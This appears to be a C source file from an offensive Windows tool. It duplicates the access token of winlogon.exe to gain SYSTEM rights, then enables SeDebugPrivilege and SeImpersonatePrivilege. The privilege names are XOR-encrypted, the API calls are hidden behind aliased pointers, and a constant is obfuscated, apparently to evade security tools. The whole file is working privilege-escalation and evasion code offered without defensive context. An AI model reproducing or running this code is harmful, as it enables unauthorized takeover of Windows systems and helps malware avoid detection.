#include "token.h"
#include "api.h"
#include "logger.h"
#include "utils.h"

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    log_info("Snapshot handle: %p", hSnapshot);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "pCTH  error: %u", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (pP32F(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = pOP(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (pOPTK(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (pDUPTOK(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            log_success("Successfully duplicated token. Process can now run as SYSTEM.");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logfile, "Failed to obtain system token");
        return FALSE;
    }
    return TRUE;
}

// ========================================
// Functions to get all privileges
// ========================================

// SeDebugPrivilege
static const unsigned char SE_DEBUG_ENC[] = { 0x63, 0x74, 0x6D, 0x77, 0x71, 0x77, 0x63, 0x70, 0x67, 0x77, 0x20, 0x2F, 0x26 };
// SeImpersonatePrivilege
static const unsigned char SE_IMP_ENC[] = { 0x63, 0x74, 0x6D, 0x7A, 0x79, 0x65, 0x73, 0x65, 0x6B, 0x76, 0x2F, 0x23, 0x37, 0x21, 0x3A, 0x28, 0x26, 0x25, 0x2C };

static const unsigned char* privs[] = {
    SE_DEBUG_ENC,
    SE_IMP_ENC
};
static const size_t priv_lens[] = {
    sizeof(SE_DEBUG_ENC),
    sizeof(SE_IMP_ENC)
};

// Function to enable a specific privilege on the provided token.
// This function does not open the token itself, but uses the token passed as parameter.
BOOL EnablePrivilege(HANDLE hToken, const unsigned char* encryptedPriv, size_t encLen) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Decrypt string
    char* dec = xor_decrypt_string(encryptedPriv, encLen, XOR_KEY, key_len);

    if (!pLPVA(NULL, dec, &luid)) {
        free(dec);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    DWORD attr = 0xA5 ^ 0xA7; // SE_PRIVILEGE_ENABLED (0x02) obfuscated
    tp.Privileges[0].Attributes = attr;

    BOOL result = pATP(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    free(dec);

    if (!result || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        return FALSE;

    return TRUE;
}

void EnableAllPrivileges(HANDLE hToken) {
    int n = sizeof(privs) / sizeof(privs[0]);
    for (int i = 0; i < n; i++) {
        if (!EnablePrivilege(hToken, privs[i], priv_lens[i])) {
            // log_error("Failed to enable priv #%d", i);
        }
        else {
            // log_success("Privilege #%d enabled", i);
        }
    }
}

